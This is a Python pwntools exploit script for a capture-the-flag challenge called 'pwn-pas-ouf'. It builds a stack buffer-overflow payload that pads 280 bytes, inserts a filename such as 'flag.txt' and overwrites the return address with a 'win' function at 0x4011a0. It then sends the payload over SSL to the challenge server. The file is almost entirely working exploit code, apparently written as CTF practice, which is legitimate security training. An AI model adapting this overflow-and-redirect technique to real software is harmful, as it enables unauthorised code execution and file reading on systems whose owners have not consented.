#!/usr/bin/python3
from pwn import *
import socket
import ssl

elf = context.binary = ELF("pwn-pas-ouf")

# offset 280

offset = b"A"*280
win = 0x4011a0

# openssl s_client -quiet -verify_quiet -connect main-5000-pwn-pas-ouf-4f2360dc7a1e5afa.ctf.4ts.fr:52525

# readme.md
payload = p64(0)*16 + b"readme.md" + p64(0)*17 + b"\x00"*7 + p64(win) + b"\n"

# flag.txt
payload1 = p64(0)*16 + b"flag.txt" + p64(0)*18 + p64(win) + b"\n"
print(payload1)

def start_ssl_client():
    # Create an SSL context
    context = ssl.create_default_context()

    # Connect to the server using SSL
    connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname='main-5000-pwn-pas-ouf-4f2360dc7a1e5afa.ctf.4ts.fr')
    connection.connect(('main-5000-pwn-pas-ouf-4f2360dc7a1e5afa.ctf.4ts.fr', 52525))


    # Receive response
    data = connection.recv(1024)
    print(f"Received: {data.decode()}")
    # Send data
    connection.sendall(payload)
    
    data = connection.recv(2048)
    print(data)
    
    connection.close()




start_ssl_client()



